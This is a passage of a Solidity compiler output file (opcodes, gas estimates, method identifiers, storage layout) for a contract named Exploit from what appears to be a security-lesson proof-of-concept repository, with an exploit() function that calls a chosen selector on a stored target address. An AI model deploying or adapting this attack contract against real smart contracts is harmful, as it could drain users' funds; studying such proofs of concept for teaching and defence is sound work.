PUSH2 0x508 DUP2 PUSH2 0x4E2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x524 JUMPI PUSH2 0x523 PUSH2 0x4AB JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x532 DUP5 DUP3 DUP6 ADD PUSH2 0x4F9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2D3 DUP1 PUSH2 0x54A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x63D9B770 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xDCE17484 EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0xF1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5A SWAP2 SWAP1 PUSH2 0x156 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD8F9738 PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xBD SWAP2 SWAP1 PUSH2 0x27B JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xEB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x140 DUP3 PUSH2 0x115 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x150 DUP2 PUSH2 0x135 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x16B PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x147 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x1B8 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x1CB JUMPI PUSH2 0x1CA PUSH2 0x171 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP DUP2 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SLOAD PUSH2 0x204 DUP2 PUSH2 0x1A0 JUMP JUMPDEST PUSH2 0x20E DUP2 DUP7 PUSH2 0x1D1 JUMP JUMPDEST SWAP5 POP PUSH1 0x1 DUP3 AND PUSH1 0x0 DUP2 EQ PUSH2 0x229 JUMPI PUSH1 0x1 DUP2 EQ PUSH2 0x23F JUMPI PUSH2 0x272 JUMP JUMPDEST PUSH1 0xFF NOT DUP4 AND DUP7 MSTORE DUP2 ISZERO ISZERO PUSH1 0x20 MUL DUP7 ADD SWAP4 POP PUSH2 0x272 JUMP JUMPDEST PUSH2 0x248 DUP6 PUSH2 0x1E2 JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x26A JUMPI DUP2 SLOAD DUP2 DUP10 ADD MSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x24B JUMP JUMPDEST DUP1 DUP9 ADD SWAP6 POP POP POP JUMPDEST POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x295 DUP2 DUP5 PUSH2 0x1F7 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0xB69F8B78ACCE75C91EF3185A855D657303B98F582E7A4C 0xE6 0xC5 0xC7 0xB9 0xE8 0x5E 0xE9 0xC3 PUSH5 0x736F6C6343 STOP ADDMOD SGT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "144600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"cake()": "2511",
						"exploit()": "infinite"
					}
				},
				"methodIdentifiers": {
					"cake()": "dce17484",
					"exploit()": "63d9b770"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 9,
						"contract": "SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol:Exploit",
						"label": "cake",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 17,
						"contract": "SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol:Exploit",
						"label": "data",
						"offset": 0,
						"slot": "1",
						"type": "t_bytes_storage"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bytes_storage": {
						"encoding": "bytes",
						"label": "bytes",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}